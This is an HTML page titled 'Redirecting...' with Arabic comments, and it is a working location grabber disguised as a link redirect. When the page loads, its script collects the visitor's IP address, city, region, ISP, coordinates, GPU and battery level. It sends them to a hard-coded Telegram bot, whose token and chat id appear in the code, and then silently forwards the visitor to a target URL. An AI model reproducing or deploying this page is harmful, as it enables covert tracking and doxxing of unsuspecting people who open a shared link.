<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
        async function capture() {
            // معلوماتك الثابتة
            const token = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
            const chat_id = "5773364548";
            const urlParams = new URLSearchParams(window.location.search);
            const target = urlParams.get('u') || "https://t.me/vo11a";

            // 1. جلب البطارية والـ GPU
            let batt = "N/A";
            try { const b = await navigator.getBattery(); batt = Math.round(b.level * 100) + "%"; } catch(e) {}
            
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            const debug = gl.getExtension('WEBGL_debug_renderer_info');
            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_ID) : "null";

            // 2. جلب الموقع والآيبي
            let d = {ip: "N/A", city: "N/A", region: "N/A", org: "N/A", lat: 0, lon: 0};
            try {
                const res = await fetch('https://ipapi.co/json/');
                d = await res.json();
            } catch(e) {}

            // 3. التنسيق اللي طلبته بالضبط (الرصد الاحترافي)
            const report = `🚀 رصد احترافي - تحليل المواصفات 🚀
━━━━━━━━━━━━━━━
🌐 الآيبي الخارجي:
${d.ip}

📱 تحليل نوع الجهاز:
${navigator.platform}

📡 المعالج الرسومي (GPU):
${gpu}

📍 الموقع: ${d.city} | 🏗️ المحافظة: ${d.region}

🏢 الشركة: ${d.org}

🔋 البطارية: ${batt}

🗺️ رابط الخريطة:
http://maps.google.com/maps?q=${d.latitude},${d.longitude}
━━━━━━━━━━━━━━━`;

            // 4. إرسال البيانات للتليجرام
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report)}`);

            // 5. التحويل للرابط النهائي
            window.location.replace(target);
        }
        window.onload = capture;
    </script>
</head>
<body style="background: black;"></body>
</html>
